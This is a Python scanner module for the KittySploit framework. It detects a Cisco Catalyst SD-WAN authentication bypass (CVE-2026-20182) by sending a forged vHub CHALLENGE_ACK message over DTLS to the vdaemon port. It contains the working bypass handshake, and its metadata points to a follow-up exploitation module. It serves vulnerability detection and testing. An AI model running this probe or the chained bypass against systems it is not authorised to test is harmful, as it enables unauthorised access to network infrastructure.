#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import os
import shutil
import struct
import subprocess
import time

from kittysploit import *
from lib.protocols.tcp.tcp_scanner_client import Tcp_scanner_client


class Module(Scanner, Tcp_scanner_client):
    __info__ = {
        "name": "Cisco Catalyst SD-WAN CVE-2026-20182 detection",
        "description": (
            "Detects CVE-2026-20182 by performing the vdaemon DTLS handshake on UDP/12346 "
            "and sending a CHALLENGE_ACK claiming device_type=2 (vHub). A CHALLENGE_ACK_ACK "
            "response indicates the authentication bypass is present. No SSH key is injected."
        ),
        "author": ["KittySploit Team"],
        "severity": "critical",
        "cve": "CVE-2026-20182",
        "references": [
            "https://www.cisco.com/c/en/us/support/docs/csa/cisco-sa-sdwan-rpa2-v69WY2SW.html",
            "https://www.rapid7.com/blog/post/ve-cve-2026-20182-critical-authentication-bypass-cisco-catalyst-sd-wan-controller-fixed/",
            "https://nvd.nist.gov/vuln/detail/CVE-2026-20182",
        ],
        "modules": [
            "auxiliary/admin/networking/cisco_sdwan_cve_2026_20182_auth_bypass",
        ],
        "tags": [
            "scanner",
            "cisco",
            "sd-wan",
            "vdaemon",
            "dtls",
            "auth-bypass",
            "cve-2026-20182",
        ],
        "agent": {
            "risk": "active",
            "effects": ["network_probe"],
            "expected_requests": 2,
            "reversible": True,
            "approval_required": False,
            "produces": ["tech_hints", "risk_signals"],
            "cost": 1.0,
            "noise": 0.3,
            "value": 1.0,
            "requires": {
                "min_endpoints": 0,
                "min_params": 0,
                "tech_hints_any": ["cisco", "sd-wan", "vmanage", "vsmart"],
                "tech_hints_all": [],
                "specializations_any": [],
                "risk_signals_any": [],
                "auth_session": False,
                "capabilities_any": [],
                "capabilities_all": [],
                "confidence_min": {},
                "confidence_min_any": {},
                "endpoint_pattern_any": [],
                "param_any": [],
                "api_surface_ready": False,
            },
            "chain": {
                "produces_capabilities": [
                    {"capability": "auth_bypass", "from_detail": ""},
                ],
                "consumes_capabilities": [],
                "option_bindings": {},
                "suggested_followups": [
                    "auxiliary/admin/networking/cisco_sdwan_cve_2026_20182_auth_bypass",
                ],
            },
        },
    }

    MSG_CHALLENGE = 8
    MSG_CHALLENGE_ACK = 9
    MSG_CHALLENGE_ACK_ACK = 10
    DEVICE_TYPE_VHUB = 2

    port = OptPort(12346, "vdaemon DTLS UDP port", True)
    handshake_wait = OptFloat(
        2.0,
        "Seconds to wait after CHALLENGE_ACK",
        required=False,
        advanced=True,
    )
    dtls_connect_wait = OptFloat(
        4.0,
        "Seconds to wait after starting openssl DTLS client",
        required=False,
        advanced=True,
    )

    def _opt(self, option):
        if hasattr(option, "value"):
            return option.value
        return option

    @staticmethod
    def _make_msg(msg_type: int, device_type: int, body: bytes = b"") -> bytes:
        header = struct.pack(
            "!BBBBII",
            (1 << 4) | msg_type,
            (device_type << 4) | 0,
            0xA0,
            0,
            0,
            1,
        )
        return header + body

    def _make_challenge_ack(self) -> bytes:
        body = struct.pack("!HH", 0x0001, 8) + b"CAFEBABE"
        body += struct.pack("!HH", 0x0002, 0)
        return self._make_msg(self.MSG_CHALLENGE_ACK, self.DEVICE_TYPE_VHUB, body)

    @staticmethod
    def _drain(proc: subprocess.Popen) -> bytes:
        data = b""
        while True:
            try:
                chunk = proc.stdout.read1(65536)
                if not chunk:
                    break
                data += chunk
            except BlockingIOError:
                break
            except Exception:
                break
        return data

    def run(self):
        host = self._host()
        if not host:
            print_error("Target host is required")
            return False
        if not shutil.which("openssl"):
            print_error("openssl is required (openssl s_client -dtls1_2)")
            return False

        connect_wait = float(self._opt(self.dtls_connect_wait) or 4.0)
        step_wait = float(self._opt(self.handshake_wait) or 2.0)
        port = int(self.port)

        print_status(f"Probing vdaemon DTLS on {host}:{port}")
        proc = subprocess.Popen(
            [
                "openssl",
                "s_client",
                "-connect",
                f"{host}:{port}",
                "-dtls1_2",
                "-quiet",
            ],
            stdin=subprocess.PIPE,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
        )
        try:
            time.sleep(connect_wait)
            os.set_blocking(proc.stdout.fileno(), False)
            initial = self._drain(proc)
            if len(initial) < 12:
                print_error("No DTLS response (vdaemon not reachable?)")
                return False

            rcv_type = initial[0] & 0x0F
            if rcv_type != self.MSG_CHALLENGE:
                print_error(f"Unexpected first message type {rcv_type} (expected CHALLENGE=8)")
                return False

            print_info("CHALLENGE received — sending vHub CHALLENGE_ACK")
            proc.stdin.write(self._make_challenge_ack())
            proc.stdin.flush()
            time.sleep(step_wait)
            resp = self._drain(proc)

            if any((byte & 0x0F) == self.MSG_CHALLENGE_ACK_ACK for byte in resp):
                self.set_info(
                    severity="critical",
                    cve="CVE-2026-20182",
                    reason=(
                        "CHALLENGE_ACK_ACK after vHub CHALLENGE_ACK — "
                        "peering authentication bypass confirmed"
                    ),
                )
                print_success("Vulnerable to CVE-2026-20182")
                return True

            self.set_info(
                severity="info",
                reason="CHALLENGE seen but no CHALLENGE_ACK_ACK (likely patched)",
            )
            print_info("vdaemon responded but auth bypass not confirmed")
            return False
        except Exception as exc:
            print_error(f"Probe failed: {exc}")
            return False
        finally:
            try:
                proc.kill()
            except Exception:
                pass
